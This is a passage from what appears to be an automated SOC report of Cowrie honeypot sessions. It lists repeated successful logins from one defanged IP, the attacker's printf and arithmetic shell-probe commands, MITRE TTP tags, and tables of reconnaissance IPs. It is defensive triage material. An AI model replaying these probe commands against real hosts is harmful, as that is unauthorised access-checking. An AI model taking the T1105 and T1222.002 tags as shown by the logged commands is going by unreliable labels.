| `2026-11-01 01:18:03` | `cowrie.command.input` |
| `2026-11-01 01:18:03` | `cowrie.command.input` |
| `2026-11-01 01:18:03` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60762bd5768

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:20 |
| **Last Seen** | 2026-11-01 01:21 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4ada9851d8a36d8353fa95ab53ad26cb_small_control'"'"' '"'"'check_4ada9851d8a36d8353fa95ab53ad26cb'"'"'', printf '\n%s|%s\n' 'check_4ada9851d8a36d8353fa95ab53ad26cb_small_control' 'check_4ada9851d8a36d8353fa95ab53ad26cb', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4ada9851d8a36d8353fa95ab53ad26cb_small_math'"'"' "$((220*345+54))"', (220*345+54, printf '\n%s|%s\n' 'check_4ada9851d8a36d8353fa95ab53ad26cb_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:20:07` | `cowrie.session.connect` |
| `2026-11-01 01:20:07` | `cowrie.client.version` |
| `2026-11-01 01:20:07` | `cowrie.client.kex` |
| `2026-11-01 01:20:09` | `cowrie.login.success` |
| `2026-11-01 01:20:12` | `cowrie.client.size` |
| `2026-11-01 01:20:12` | `cowrie.session.params` |
| `2026-11-01 01:20:13` | `cowrie.command.input` |
| `2026-11-01 01:20:13` | `cowrie.command.input` |
| `2026-11-01 01:20:13` | `cowrie.command.input` |
| `2026-11-01 01:20:13` | `cowrie.command.input` |
| `2026-11-01 01:20:13` | `cowrie.command.input` |
| `2026-11-01 01:20:13` | `cowrie.command.input` |
| `2026-11-01 01:20:13` | `cowrie.command.input` |
| `2026-11-01 01:20:13` | `cowrie.command.input` |
| `2026-11-01 01:20:13` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfcf410c9222

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:22 |
| **Last Seen** | 2026-11-01 01:23 |
| **Session Duration** | 70s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e38cae907fc73c0d5f42214d8c1e810b_small_control'"'"' '"'"'check_e38cae907fc73c0d5f42214d8c1e810b'"'"'', printf '\n%s|%s\n' 'check_e38cae907fc73c0d5f42214d8c1e810b_small_control' 'check_e38cae907fc73c0d5f42214d8c1e810b', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e38cae907fc73c0d5f42214d8c1e810b_small_math'"'"' "$((427*94+53))"', (427*94+53, printf '\n%s|%s\n' 'check_e38cae907fc73c0d5f42214d8c1e810b_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:22:18` | `cowrie.session.connect` |
| `2026-11-01 01:22:18` | `cowrie.client.version` |
| `2026-11-01 01:22:18` | `cowrie.client.kex` |
| `2026-11-01 01:22:20` | `cowrie.login.success` |
| `2026-11-01 01:22:22` | `cowrie.client.size` |
| `2026-11-01 01:22:23` | `cowrie.session.params` |
| `2026-11-01 01:22:23` | `cowrie.command.input` |
| `2026-11-01 01:22:23` | `cowrie.command.input` |
| `2026-11-01 01:22:23` | `cowrie.command.input` |
| `2026-11-01 01:22:23` | `cowrie.command.input` |
| `2026-11-01 01:22:23` | `cowrie.command.input` |
| `2026-11-01 01:22:23` | `cowrie.command.input` |
| `2026-11-01 01:22:23` | `cowrie.command.input` |
| `2026-11-01 01:22:23` | `cowrie.command.input` |
| `2026-11-01 01:22:23` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdb3ae528bc1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:24 |
| **Last Seen** | 2026-11-01 01:25 |
| **Session Duration** | 64s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_19de1d72285fca6be34536e19e54df03_small_control'"'"' '"'"'check_19de1d72285fca6be34536e19e54df03'"'"'', printf '\n%s|%s\n' 'check_19de1d72285fca6be34536e19e54df03_small_control' 'check_19de1d72285fca6be34536e19e54df03', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_19de1d72285fca6be34536e19e54df03_small_math'"'"' "$((641*602+27))"', (641*602+27, printf '\n%s|%s\n' 'check_19de1d72285fca6be34536e19e54df03_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:24:20` | `cowrie.session.connect` |
| `2026-11-01 01:24:21` | `cowrie.client.version` |
| `2026-11-01 01:24:21` | `cowrie.client.kex` |
| `2026-11-01 01:24:23` | `cowrie.login.success` |
| `2026-11-01 01:24:25` | `cowrie.client.size` |
| `2026-11-01 01:24:25` | `cowrie.session.params` |
| `2026-11-01 01:24:26` | `cowrie.command.input` |
| `2026-11-01 01:24:26` | `cowrie.command.input` |
| `2026-11-01 01:24:26` | `cowrie.command.input` |
| `2026-11-01 01:24:26` | `cowrie.command.input` |
| `2026-11-01 01:24:26` | `cowrie.command.input` |
| `2026-11-01 01:24:26` | `cowrie.command.input` |
| `2026-11-01 01:24:26` | `cowrie.command.input` |
| `2026-11-01 01:24:26` | `cowrie.command.input` |
| `2026-11-01 01:24:26` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc383f6489a5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:28 |
| **Last Seen** | 2026-11-01 01:29 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2fabdc932d261c382dc248128468872f_small_control'"'"' '"'"'check_2fabdc932d261c382dc248128468872f'"'"'', printf '\n%s|%s\n' 'check_2fabdc932d261c382dc248128468872f_small_control' 'check_2fabdc932d261c382dc248128468872f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2fabdc932d261c382dc248128468872f_small_math'"'"' "$((240*972+79))"', (240*972+79, printf '\n%s|%s\n' 'check_2fabdc932d261c382dc248128468872f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:28:27` | `cowrie.session.connect` |
| `2026-11-01 01:28:27` | `cowrie.client.version` |
| `2026-11-01 01:28:27` | `cowrie.client.kex` |
| `2026-11-01 01:28:29` | `cowrie.login.success` |
| `2026-11-01 01:28:30` | `cowrie.client.size` |
| `2026-11-01 01:28:31` | `cowrie.session.params` |
| `2026-11-01 01:28:31` | `cowrie.command.input` |
| `2026-11-01 01:28:31` | `cowrie.command.input` |
| `2026-11-01 01:28:31` | `cowrie.command.input` |
| `2026-11-01 01:28:31` | `cowrie.command.input` |
| `2026-11-01 01:28:31` | `cowrie.command.input` |
| `2026-11-01 01:28:31` | `cowrie.command.input` |
| `2026-11-01 01:28:31` | `cowrie.command.input` |
| `2026-11-01 01:28:31` | `cowrie.command.input` |
| `2026-11-01 01:28:31` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fbd5029c73b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:30 |
| **Last Seen** | 2026-11-01 01:31 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_356d65387d7e38e9210c983622917b53_small_control'"'"' '"'"'check_356d65387d7e38e9210c983622917b53'"'"'', printf '\n%s|%s\n' 'check_356d65387d7e38e9210c983622917b53_small_control' 'check_356d65387d7e38e9210c983622917b53', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_356d65387d7e38e9210c983622917b53_small_math'"'"' "$((717*147+1))"', (717*147+1, printf '\n%s|%s\n' 'check_356d65387d7e38e9210c983622917b53_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:30:32` | `cowrie.session.connect` |
| `2026-11-01 01:30:33` | `cowrie.client.version` |
| `2026-11-01 01:30:33` | `cowrie.client.kex` |
| `2026-11-01 01:30:34` | `cowrie.login.success` |
| `2026-11-01 01:30:35` | `cowrie.client.size` |
| `2026-11-01 01:30:36` | `cowrie.session.params` |
| `2026-11-01 01:30:36` | `cowrie.command.input` |
| `2026-11-01 01:30:36` | `cowrie.command.input` |
| `2026-11-01 01:30:36` | `cowrie.command.input` |
| `2026-11-01 01:30:36` | `cowrie.command.input` |
| `2026-11-01 01:30:36` | `cowrie.command.input` |
| `2026-11-01 01:30:36` | `cowrie.command.input` |
| `2026-11-01 01:30:36` | `cowrie.command.input` |
| `2026-11-01 01:30:36` | `cowrie.command.input` |
| `2026-11-01 01:30:36` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf5fecae33f9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:32 |
| **Last Seen** | 2026-11-01 01:33 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_616c923d255257a0f1978e1300ee9772_small_control'"'"' '"'"'check_616c923d255257a0f1978e1300ee9772'"'"'', printf '\n%s|%s\n' 'check_616c923d255257a0f1978e1300ee9772_small_control' 'check_616c923d255257a0f1978e1300ee9772', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_616c923d255257a0f1978e1300ee9772_small_math'"'"' "$((16*771+12))"', (16*771+12, printf '\n%s|%s\n' 'check_616c923d255257a0f1978e1300ee9772_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:32:43` | `cowrie.session.connect` |
| `2026-11-01 01:32:43` | `cowrie.client.version` |
| `2026-11-01 01:32:43` | `cowrie.client.kex` |
| `2026-11-01 01:32:44` | `cowrie.login.success` |
| `2026-11-01 01:32:46` | `cowrie.client.size` |
| `2026-11-01 01:32:46` | `cowrie.session.params` |
| `2026-11-01 01:32:46` | `cowrie.command.input` |
| `2026-11-01 01:32:46` | `cowrie.command.input` |
| `2026-11-01 01:32:46` | `cowrie.command.input` |
| `2026-11-01 01:32:46` | `cowrie.command.input` |
| `2026-11-01 01:32:46` | `cowrie.command.input` |
| `2026-11-01 01:32:46` | `cowrie.command.input` |
| `2026-11-01 01:32:46` | `cowrie.command.input` |
| `2026-11-01 01:32:46` | `cowrie.command.input` |
| `2026-11-01 01:32:46` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa2178a7f546

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:34 |
| **Last Seen** | 2026-11-01 01:35 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4dfc8ab3e3e598811683a85fe410c767_small_control'"'"' '"'"'check_4dfc8ab3e3e598811683a85fe410c767'"'"'', printf '\n%s|%s\n' 'check_4dfc8ab3e3e598811683a85fe410c767_small_control' 'check_4dfc8ab3e3e598811683a85fe410c767', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4dfc8ab3e3e598811683a85fe410c767_small_math'"'"' "$((25*823+80))"', (25*823+80, printf '\n%s|%s\n' 'check_4dfc8ab3e3e598811683a85fe410c767_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:34:57` | `cowrie.session.connect` |
| `2026-11-01 01:34:57` | `cowrie.client.version` |
| `2026-11-01 01:34:57` | `cowrie.client.kex` |
| `2026-11-01 01:34:59` | `cowrie.login.success` |
| `2026-11-01 01:35:00` | `cowrie.client.size` |
| `2026-11-01 01:35:01` | `cowrie.session.params` |
| `2026-11-01 01:35:01` | `cowrie.command.input` |
| `2026-11-01 01:35:01` | `cowrie.command.input` |
| `2026-11-01 01:35:01` | `cowrie.command.input` |
| `2026-11-01 01:35:01` | `cowrie.command.input` |
| `2026-11-01 01:35:01` | `cowrie.command.input` |
| `2026-11-01 01:35:01` | `cowrie.command.input` |
| `2026-11-01 01:35:01` | `cowrie.command.input` |
| `2026-11-01 01:35:01` | `cowrie.command.input` |
| `2026-11-01 01:35:01` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41bd6a42092a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:37 |
| **Last Seen** | 2026-11-01 01:37 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_743bd70d350c0e14a5989daa61628eed_small_control'"'"' '"'"'check_743bd70d350c0e14a5989daa61628eed'"'"'', printf '\n%s|%s\n' 'check_743bd70d350c0e14a5989daa61628eed_small_control' 'check_743bd70d350c0e14a5989daa61628eed', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_743bd70d350c0e14a5989daa61628eed_small_math'"'"' "$((843*549+74))"', (843*549+74, printf '\n%s|%s\n' 'check_743bd70d350c0e14a5989daa61628eed_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:37:12` | `cowrie.session.connect` |
| `2026-11-01 01:37:12` | `cowrie.client.version` |
| `2026-11-01 01:37:12` | `cowrie.client.kex` |
| `2026-11-01 01:37:14` | `cowrie.login.success` |
| `2026-11-01 01:37:15` | `cowrie.client.size` |
| `2026-11-01 01:37:15` | `cowrie.session.params` |
| `2026-11-01 01:37:15` | `cowrie.command.input` |
| `2026-11-01 01:37:15` | `cowrie.command.input` |
| `2026-11-01 01:37:15` | `cowrie.command.input` |
| `2026-11-01 01:37:15` | `cowrie.command.input` |
| `2026-11-01 01:37:15` | `cowrie.command.input` |
| `2026-11-01 01:37:15` | `cowrie.command.input` |
| `2026-11-01 01:37:15` | `cowrie.command.input` |
| `2026-11-01 01:37:15` | `cowrie.command.input` |
| `2026-11-01 01:37:15` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac509eec633

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:39 |
| **Last Seen** | 2026-11-01 01:40 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_77b07730b8d9313ff03b6ada62081f31_small_control'"'"' '"'"'check_77b07730b8d9313ff03b6ada62081f31'"'"'', printf '\n%s|%s\n' 'check_77b07730b8d9313ff03b6ada62081f31_small_control' 'check_77b07730b8d9313ff03b6ada62081f31', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_77b07730b8d9313ff03b6ada62081f31_small_math'"'"' "$((731*783+86))"', (731*783+86, printf '\n%s|%s\n' 'check_77b07730b8d9313ff03b6ada62081f31_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:39:29` | `cowrie.session.connect` |
| `2026-11-01 01:39:29` | `cowrie.client.version` |
| `2026-11-01 01:39:29` | `cowrie.client.kex` |
| `2026-11-01 01:39:30` | `cowrie.login.success` |
| `2026-11-01 01:39:31` | `cowrie.client.size` |
| `2026-11-01 01:39:31` | `cowrie.session.params` |
| `2026-11-01 01:39:32` | `cowrie.command.input` |
| `2026-11-01 01:39:32` | `cowrie.command.input` |
| `2026-11-01 01:39:32` | `cowrie.command.input` |
| `2026-11-01 01:39:32` | `cowrie.command.input` |
| `2026-11-01 01:39:32` | `cowrie.command.input` |
| `2026-11-01 01:39:32` | `cowrie.command.input` |
| `2026-11-01 01:39:32` | `cowrie.command.input` |
| `2026-11-01 01:39:32` | `cowrie.command.input` |
| `2026-11-01 01:39:32` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d610f73fdccd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:41 |
| **Last Seen** | 2026-11-01 01:42 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0ded9da93ae3a7e6d73f57c23bf27c6a_small_control'"'"' '"'"'check_0ded9da93ae3a7e6d73f57c23bf27c6a'"'"'', printf '\n%s|%s\n' 'check_0ded9da93ae3a7e6d73f57c23bf27c6a_small_control' 'check_0ded9da93ae3a7e6d73f57c23bf27c6a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0ded9da93ae3a7e6d73f57c23bf27c6a_small_math'"'"' "$((575*722+74))"', (575*722+74, printf '\n%s|%s\n' 'check_0ded9da93ae3a7e6d73f57c23bf27c6a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:41:45` | `cowrie.session.connect` |
| `2026-11-01 01:41:45` | `cowrie.client.version` |
| `2026-11-01 01:41:45` | `cowrie.client.kex` |
| `2026-11-01 01:41:46` | `cowrie.login.success` |
| `2026-11-01 01:41:47` | `cowrie.client.size` |
| `2026-11-01 01:41:47` | `cowrie.session.params` |
| `2026-11-01 01:41:47` | `cowrie.command.input` |
| `2026-11-01 01:41:47` | `cowrie.command.input` |
| `2026-11-01 01:41:47` | `cowrie.command.input` |
| `2026-11-01 01:41:47` | `cowrie.command.input` |
| `2026-11-01 01:41:47` | `cowrie.command.input` |
| `2026-11-01 01:41:47` | `cowrie.command.input` |
| `2026-11-01 01:41:47` | `cowrie.command.input` |
| `2026-11-01 01:41:48` | `cowrie.command.input` |
| `2026-11-01 01:41:48` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bf54ffd2918

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:43 |
| **Last Seen** | 2026-11-01 01:44 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b017a485b7c522f855a46bbba44eccd3_small_control'"'"' '"'"'check_b017a485b7c522f855a46bbba44eccd3'"'"'', printf '\n%s|%s\n' 'check_b017a485b7c522f855a46bbba44eccd3_small_control' 'check_b017a485b7c522f855a46bbba44eccd3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b017a485b7c522f855a46bbba44eccd3_small_math'"'"' "$((215*496+72))"', (215*496+72, printf '\n%s|%s\n' 'check_b017a485b7c522f855a46bbba44eccd3_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:43:53` | `cowrie.session.connect` |
| `2026-11-01 01:43:53` | `cowrie.client.version` |
| `2026-11-01 01:43:53` | `cowrie.client.kex` |
| `2026-11-01 01:43:54` | `cowrie.login.success` |
| `2026-11-01 01:43:56` | `cowrie.client.size` |
| `2026-11-01 01:43:56` | `cowrie.session.params` |
| `2026-11-01 01:43:57` | `cowrie.command.input` |
| `2026-11-01 01:43:57` | `cowrie.command.input` |
| `2026-11-01 01:43:57` | `cowrie.command.input` |
| `2026-11-01 01:43:57` | `cowrie.command.input` |
| `2026-11-01 01:43:57` | `cowrie.command.input` |
| `2026-11-01 01:43:57` | `cowrie.command.input` |
| `2026-11-01 01:43:57` | `cowrie.command.input` |
| `2026-11-01 01:43:57` | `cowrie.command.input` |
| `2026-11-01 01:43:57` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60b3aa99acc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-01 01:46 |
| **Last Seen** | 2026-11-01 01:46 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9e9bbf02aad7bb96c95360925fa10763_small_control'"'"' '"'"'check_9e9bbf02aad7bb96c95360925fa10763'"'"'', printf '\n%s|%s\n' 'check_9e9bbf02aad7bb96c95360925fa10763_small_control' 'check_9e9bbf02aad7bb96c95360925fa10763', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9e9bbf02aad7bb96c95360925fa10763_small_math'"'"' "$((724*340+58))"', (724*340+58, printf '\n%s|%s\n' 'check_9e9bbf02aad7bb96c95360925fa10763_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-01 01:46:04` | `cowrie.session.connect` |
| `2026-11-01 01:46:04` | `cowrie.client.version` |
| `2026-11-01 01:46:04` | `cowrie.client.kex` |
| `2026-11-01 01:46:05` | `cowrie.login.success` |
| `2026-11-01 01:46:06` | `cowrie.client.size` |
| `2026-11-01 01:46:07` | `cowrie.session.params` |
| `2026-11-01 01:46:07` | `cowrie.command.input` |
| `2026-11-01 01:46:07` | `cowrie.command.input` |
| `2026-11-01 01:46:07` | `cowrie.command.input` |
| `2026-11-01 01:46:07` | `cowrie.command.input` |
| `2026-11-01 01:46:07` | `cowrie.command.input` |
| `2026-11-01 01:46:07` | `cowrie.command.input` |
| `2026-11-01 01:46:07` | `cowrie.command.input` |
| `2026-11-01 01:46:07` | `cowrie.command.input` |
| `2026-11-01 01:46:07` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (6) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-52d7ea6f3758 | HIGH | `92.118.39[.]14` | 2026-11-01 01:48 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-43399f8ca3b8 | HIGH | `92.118.39[.]14` | 2026-11-01 01:50 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-269aae1b71f2 | HIGH | `92.118.39[.]14` | 2026-11-01 01:52 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-fa1dd809f5e7 | HIGH | `77.25.154[.]132` | 2026-11-01 01:57 | Y | 1 | 0 | `T1078` |
| IR-75f8d1c6659e | HIGH | `144.22.238[.]238` | 2026-11-01 02:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-12612b30dd6a | HIGH | `193.187.110[.]160` | 2026-11-01 02:26 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **2** | 2026-11-01 00:44 | 2026-11-01 02:40 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-11-01 00:19 | 2026-11-01 02:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `85.11.167[.]83` | **2** | 2026-11-01 00:51 | 2026-11-01 02:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `100.58.113[.]108` | 1 | 2026-11-01 01:22 | 2026-11-01 01:22 | 1s | 0 | `T1592` | 🟢 LOW |
| `109.245.170[.]220` | 1 | 2026-11-01 01:34 | 2026-11-01 01:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.28.193[.]143` | 1 | 2026-11-01 01:32 | 2026-11-01 01:32 | 32s | 0 | `T1592` | 🟢 LOW |
| `121.147.220[.]27` | 1 | 2026-11-01 01:19 | 2026-11-01 01:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `121.152.123[.]106` | 1 | 2026-11-01 02:24 | 2026-11-01 02:24 | 29s | 0 | `T1592` | 🟢 LOW |
| `121.66.236[.]9` | 1 | 2026-11-01 02:44 | 2026-11-01 02:44 | 30s | 0 | `T1592` | 🟢 LOW |
| `124.29.225[.]79` | 1 | 2026-11-01 00:25 | 2026-11-01 00:25 | 33s | 0 | `T1592` | 🟢 LOW |
| `146.120.251[.]75` | 1 | 2026-11-01 00:30 | 2026-11-01 00:30 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]193` | 1 | 2026-11-01 02:53 | 2026-11-01 02:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.191.118[.]180` | 1 | 2026-11-01 00:47 | 2026-11-01 00:48 | 32s | 0 | `T1592` | 🟢 LOW |
| `185.186.233[.]189` | 1 | 2026-11-01 02:14 | 2026-11-01 02:14 | 0s | 0 | `T1592` | 🟢 LOW |
